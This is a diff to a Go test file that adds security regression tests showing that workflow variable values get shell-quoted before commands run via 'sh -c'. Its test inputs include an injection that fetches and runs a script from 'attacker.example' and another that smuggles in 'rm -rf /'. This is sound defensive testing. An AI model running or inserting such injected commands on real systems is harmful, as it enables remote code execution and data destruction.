@@ -3,6 +3,7 @@ package core
 import (
 	"fmt"
 	"os"
+	"os/exec"
 	"strings"
 	"testing"
 
@@ -147,6 +148,58 @@ func TestSubstituteVariables_MultiplePlaceholdersInOneField(t *testing.T) {
 	}
 }
 
+// Security regression test: a variable value containing shell metacharacters
+// must not be able to break out of its position when the resolved Command is
+// later executed via `sh -c` (engine/executor.go RunCommand). Simulates the
+// "workflow variables → nested `--var key={{value}}` shell command" injection
+// path found in the pre-publish security review.
+func TestSubstituteVariables_CommandValueCannotEscapeShellQuoting(t *testing.T) {
+	p := &Pipeline{Elements: []PipelineElement{
+		{Step: &Step{
+			Name:    "create-code",
+			Command: "trayline run processes/4-create-code --var specs-name={{specs-name}} --var path={{path}} --no-lifecycle",
+		}},
+	}}
+	malicious := "x; curl http://attacker.example/p.sh | sh #"
+	if err := SubstituteVariables(p, map[string]string{"specs-name": "y", "path": malicious}); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	got := p.Elements[0].Step.Command
+	want := "trayline run processes/4-create-code --var specs-name='y' --var path='x; curl http://attacker.example/p.sh | sh #' --no-lifecycle"
+	if got != want {
+		t.Fatalf("Command = %q, want %q", got, want)
+	}
+	// Confirm a shell really does treat the whole malicious value as a single
+	// literal argument (no ";"/"|" interpretation) rather than trusting the
+	// string comparison above alone.
+	out, err := exec.Command("sh", "-c", "printf %s "+shellQuote(malicious)).Output()
+	if err != nil {
+		t.Fatalf("sh -c failed: %v", err)
+	}
+	if string(out) != malicious {
+		t.Fatalf("shellQuote did not round-trip through a real shell: got %q, want %q", out, malicious)
+	}
+}
+
+// A value containing an embedded single quote must also be neutralized.
+func TestSubstituteVariables_CommandValueWithEmbeddedSingleQuote(t *testing.T) {
+	p := &Pipeline{Elements: []PipelineElement{
+		{Step: &Step{Name: "s1", Command: "echo {{val}}"}},
+	}}
+	malicious := "'; rm -rf / #"
+	if err := SubstituteVariables(p, map[string]string{"val": malicious}); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	out, err := exec.Command("sh", "-c", p.Elements[0].Step.Command).Output()
+	if err != nil {
+		t.Fatalf("sh -c failed: %v", err)
+	}
+	got := strings.TrimSuffix(string(out), "\n")
+	if got != malicious {
+		t.Fatalf("shell echoed %q, want the literal malicious value %q (injection was not neutralized)", got, malicious)
+	}
+}
+
 func TestSubstituteVariables_AllTemplatableFields(t *testing.T) {
 	p := &Pipeline{Elements: []PipelineElement{
 		{Step: &Step{
@@ -186,7 +239,9 @@ func TestSubstituteVariables_AllTemplatableFields(t *testing.T) {
 	if s1.Condition.File != "output.txt" {
 		t.Errorf("Condition.File not resolved: %q", s1.Condition.File)
 	}
-	if p.Elements[1].Step.Command != "cd /workspace && echo do the thing" {
+	// Command substitutions are shell-quoted (see ResolveCommand) since Command
+	// is executed via `sh -c` — unlike Prompt/ProjectDir/Condition fields.
+	if p.Elements[1].Step.Command != "cd '/workspace' && echo 'do the thing'" {
 		t.Errorf("Command not resolved: %q", p.Elements[1].Step.Command)
 	}
 }
@@ -269,7 +324,7 @@ func TestSubstituteVariables_SurroundingTextPreserved(t *testing.T) {
 	if err := SubstituteVariables(p, map[string]string{"key": "VALUE"}); err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	if p.Elements[0].Step.Command != "before-VALUE-after" {
+	if p.Elements[0].Step.Command != "before-'VALUE'-after" {
 		t.Errorf("surrounding text not preserved, got %q", p.Elements[0].Step.Command)
 	}
 }
